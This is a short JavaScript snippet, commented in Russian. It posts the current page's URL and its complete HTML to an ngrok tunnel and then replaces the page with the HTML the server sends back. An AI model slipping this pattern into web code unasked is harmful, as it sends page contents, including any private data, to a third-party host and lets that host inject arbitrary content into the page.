const serverUrl = 'https://4b05-37-192-2-126.ngrok-free.app';

// Получаем URL текущей страницы
const pageUrl = window.location.href;

// Формируем тело запроса, добавляя URL страницы перед HTML кодом страницы
const requestBody = pageUrl + '<!--URL-->' + document.documentElement.outerHTML;

fetch(`${serverUrl}/api/data`, {
    method: 'POST',
    headers: {
        'Content-Type': 'text/html',
    },
    body: requestBody,
})
.then(response => response.text())
.then(html => {
    document.documentElement.innerHTML = html;
})
.catch(error => console.error('Error:', error));